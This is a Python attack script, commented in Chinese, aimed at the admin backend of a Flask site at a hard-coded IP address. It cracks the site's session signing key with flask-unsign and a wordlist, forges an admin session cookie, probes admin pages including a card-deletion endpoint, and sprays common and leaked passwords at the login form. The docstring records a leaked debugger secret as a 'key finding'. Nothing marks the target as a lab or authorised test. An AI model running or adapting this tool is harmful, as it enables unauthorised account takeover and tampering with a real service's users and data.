#!/usr/bin/env python3
"""
Admin 后台攻击链 — session 破解 / 伪造 / 登录喷洒

关键发现 (2026-07-07):
  - debugger 页面里的 SECRET= 是 Werkzeug 调试密钥，不是 Flask secret_key
  - 真实 session 签名无法用 pohZc8RrQkczwHyYZUbX 验证
  - 需先破解 secret_key 才能伪造 session['admin'] 进 /admin/users

用法:
  python3 tools/admin_attack.py --crack-session --cookie '<Set-Cookie session=...>'
  python3 tools/admin_attack.py --forge --secret '<flask_secret>' --admin-user admin
  python3 tools/admin_attack.py --spray-login
  python3 tools/admin_attack.py --probe-admin
"""
from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

MAIN = "http://43.154.128.116:9110"
WORDLIST = Path(__file__).resolve().parents[1] / "analysis" / "wordlist_flask_secret.txt"


def req(method: str, path: str, body: dict | None = None, cookie: str = "") -> tuple[int, str, dict]:
    data = None
    headers: dict[str, str] = {}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    if cookie:
        headers["Cookie"] = cookie
    r = urllib.request.Request(MAIN + path, data=data, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=12)
        return resp.status, resp.read().decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)


def crack_session(cookie: str, wordlist: Path) -> str | None:
    proc = subprocess.run(
        ["flask-unsign", "--unsign", "--no-literal-eval", "--cookie", cookie, "--wordlist", str(wordlist)],
        capture_output=True,
        text=True,
    )
    out = proc.stdout + proc.stderr
    m = re.search(r"\[+\] Found secret key[^\n]*\n(.+)", out)
    if m:
        return m.group(1).strip()
    if "Found secret" in out:
        for line in out.splitlines():
            if line.startswith("[+]"):
                return line.split(":", 1)[-1].strip()
    print(out[-2000:])
    return None


def forge_session(secret: str, admin_user: str) -> str:
    proc = subprocess.run(
        ["flask-unsign", "--sign", "--secret", secret, "--cookie", f"{{'admin': '{admin_user}'}}"],
        capture_output=True,
        text=True,
    )
    if proc.returncode != 0:
        raise RuntimeError(proc.stderr)
    return proc.stdout.strip()


def probe_admin(cookie: str) -> None:
    for path in ["/dashboard", "/admin/users", "/admin/delete-cards"]:
        code, body, hdrs = req("GET", path, cookie=f"session={cookie}")
        title = re.search(r"<title>([^<]+)</title>", body)
        print(f"{code} GET {path} -> {hdrs.get('Location', '')} title={title.group(1) if title else '?'}")
        if "账号系统" not in body and code == 200:
            print(body[:500])


def spray_login() -> None:
    users = ["admin", "root", "kuaichaq", "试试看洋芋", "yangyu", "operator"]
    pwds = ["admin123", "123456", "kuaichaq123", "88888888", "pohZc8RrQkczwHyYZUbX"]
    for u in users:
        for p in pwds:
            cj = http.cookiejar.CookieJar()
            op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
            data = urllib.parse.urlencode({"username": u, "password": p}).encode()
            r = urllib.request.Request(MAIN + "/login", data=data, method="POST")
            try:
                resp = op.open(r, timeout=8)
                html = resp.read().decode("utf-8", "replace")
                if "/dashboard" in resp.geturl() or "账号系统" not in html:
                    print(f"HIT {u}:{p} -> {resp.geturl()}")
                    for c in cj:
                        print(f"  cookie {c.name}={c.value[:60]}")
                    return
            except Exception:
                pass
            time.sleep(0.1)
    print("login spray: no hit")


def capture_session_cookie() -> str:
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    data = urllib.parse.urlencode({"username": "admin", "password": "wrong"}).encode()
    op.open(urllib.request.Request(MAIN + "/login", data=data, method="POST"), timeout=8)
    for c in cj:
        if c.name == "session":
            return c.value
    raise RuntimeError("no session cookie")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--crack-session", action="store_true")
    ap.add_argument("--cookie", help="Flask session cookie value")
    ap.add_argument("--wordlist", type=Path, default=WORDLIST)
    ap.add_argument("--forge", action="store_true")
    ap.add_argument("--secret")
    ap.add_argument("--admin-user", default="admin")
    ap.add_argument("--probe-admin", action="store_true")
    ap.add_argument("--spray-login", action="store_true")
    args = ap.parse_args()

    if args.crack_session:
        cookie = args.cookie or capture_session_cookie()
        print(f"cookie={cookie[:50]}...")
        secret = crack_session(cookie, args.wordlist)
        if secret:
            print(f"[OK] flask secret_key = {secret}")
            cookie = forge_session(secret, args.admin_user)
            probe_admin(cookie)
        else:
            sys.exit(1)

    if args.forge:
        if not args.secret:
            ap.error("--forge requires --secret")
        cookie = forge_session(args.secret, args.admin_user)
        print(f"forged session={cookie[:60]}...")
        probe_admin(cookie)

    if args.probe_admin:
        if not args.cookie:
            ap.error("--probe-admin requires --cookie")
        probe_admin(args.cookie)

    if args.spray_login:
        spray_login()

    if not any([args.crack_session, args.forge, args.probe_admin, args.spray_login]):
        ap.print_help()


if __name__ == "__main__":
    main()
